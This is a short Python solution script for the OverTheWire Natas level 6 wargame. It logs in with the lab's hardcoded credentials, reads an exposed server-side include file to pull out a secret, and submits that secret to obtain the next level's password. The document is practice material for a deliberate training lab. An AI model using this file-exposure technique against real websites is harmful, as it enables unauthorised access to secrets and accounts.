import requests
import re
requests.packages.urllib3.disable_warnings()

url = "http://natas6.natas.labs.overthewire.org"

def get_secret():
    r = requests.get(url + "/includes/secret.inc", auth=('natas6', '0RoJwHdSKWFTYR5WuiAewauSuNaBXned'), verify=False)
    if r.status_code == 200:
        secret_is = re.findall('secret = "(.+)"', r.text)[0]
    return secret_is

def exp():
    data_post = {
        "secret": get_secret(),
        "submit": "Submit"
    }

    r = requests.post(url, auth=('natas6', '0RoJwHdSKWFTYR5WuiAewauSuNaBXned'), verify=False, data=data_post)
    if r.status_code == 200:
        password = re.findall('natas7 is (.+)', r.text)[0]
        print("Password for natas7: " + password)

if __name__ == "__main__":
    exp()